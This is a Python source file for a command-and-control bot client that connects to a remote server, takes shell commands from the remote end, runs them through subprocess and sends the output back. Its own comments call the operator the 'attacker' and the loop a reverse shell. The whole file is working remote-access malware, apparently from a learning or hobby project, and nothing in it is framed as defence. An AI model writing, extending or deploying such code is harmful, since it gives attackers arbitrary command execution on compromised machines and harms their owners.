import sys
from subprocess import Popen, PIPE, run
from socket import *
from termcolor import colored

default_port = 38433


class BotClient:
    def __init__(self, server_name=None, server_port=default_port):
        # get attackers IP address as the first command line parameter and set the port
        self.server_name = server_name
        self.server_port = server_port
        self.client_socket = socket(AF_INET, SOCK_STREAM)

    def connect(self):
        # connect the sockt using a tuple containing the sockets IP address and port
        try:
            self.client_socket.connect((self.server_name, self.server_port))
            print(
                colored(
                    f"You have successfully connected to the C2 server at {self.server_name}:{self.server_port}",
                    "green",
                    "on_grey",
                    ["bold"],
                )
            )
        except IndexError:
            print(
                colored(
                    f"Please provide the attacker's IP address as a command line argument.",
                    "red",
                )
            )
            exit()
        except ConnectionRefusedError:
            print(
                colored(
                    "Connection refused. Make sure the C2 server is listening on the specified port.",
                    "red",
                    "on_grey",
                    ["bold"],
                )
            )
            exit()

    def send_message(self, message):
        self.client_socket.sendall(message.encode())

    def run(self):
        self.connect()
        command = (self.client_socket.recv(4064)).decode()

        # keep the port open for as long as the attacker doesn't exit the reverse shell
        while command != "exit":
            if command.strip() == "this_is_empty":
                # If the command is empty, send a message to the C2 server and wait for the next command
                self.client_socket.sendall("Empty command received".encode())
                command = (self.client_socket.recv(4064)).decode()
                continue
            try:
                # create a subprocess using the run method and pass the command to the subprocess
                result = run(command.split(" "), capture_output=True)

                # get the result and error output from the completed process
                output = result.stdout
                error = result.stderr

                # send the result to the attacker's machine
                self.client_socket.sendall(output)
                self.client_socket.sendall(error)
            except Exception as e:
                # handle the FileNotFoundError
                error_message = str(e).encode()
                self.client_socket.sendall(error_message)

            # recieve the next command
            command = (self.client_socket.recv(4064)).decode()

        print(colored("C2 server shutdown. Exiting...", "red", "on_black", ["bold"]))
        self.client_socket.close()
        sys.exit(1)


def main():
    if len(sys.argv) < 2:
        print(
            colored(
                f"You have entered too few commandline arguments. Provide the C2 server address as the first argument and an optional port number as the second argument. The default port number is {default_port}",
                "red",
                "on_grey",
                ["bold"],
            )
        )
        return
    elif len(sys.argv) == 2:
        server_name = sys.argv[1]
        server_port = default_port
    elif len(sys.argv) == 3:
        server_name = sys.argv[1]
        server_port = int(sys.argv[2])
    else:
        print(
            colored(
                f"You have entered too many commandline arguments. Provide the C2 server address as the first argument and an optional port number as the second argument. The default port number is {default_port}",
                "red",
                "on_grey",
                ["bold"],
            )
        )
        return

    bot = BotClient(server_name, server_port)
    try:
        bot.run()
    except BrokenPipeError:
        print(
            colored(
                "Connection to server lost. Exiting...", "red", "on_black", ["bold"]
            )
        )
        sys.exit(1)
    except KeyboardInterrupt:
        # handle a Keyboard Interrupt (Ctrl+C)
        print("Keyboard Interrupt. Closing Bot Client...")
        sys.exit(1)


if __name__ == "__main__":
    main()
